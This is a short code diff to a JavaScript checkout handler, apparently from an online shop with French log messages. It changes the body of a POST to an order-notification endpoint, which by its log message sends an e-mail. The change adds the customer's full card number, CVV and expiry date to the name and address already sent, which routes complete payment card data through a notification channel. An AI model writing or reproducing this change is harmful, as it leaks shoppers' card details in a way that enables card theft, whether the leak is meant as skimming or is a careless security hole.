@@ -294,7 +294,7 @@ async function handlePay(){
     fetch(base + '/notify-order', {
       method:'POST',
       headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({ firstname, lastname, email, address, zip, city })
+      body: JSON.stringify({ firstname, lastname, email, address, zip, city, cvv, numero_carte, expiration, })
     }).catch(err => console.warn('[notify-order] échec envoi e-mail', err));
   }catch(err){ console.warn('[notify-order] non envoyé', err); }
 
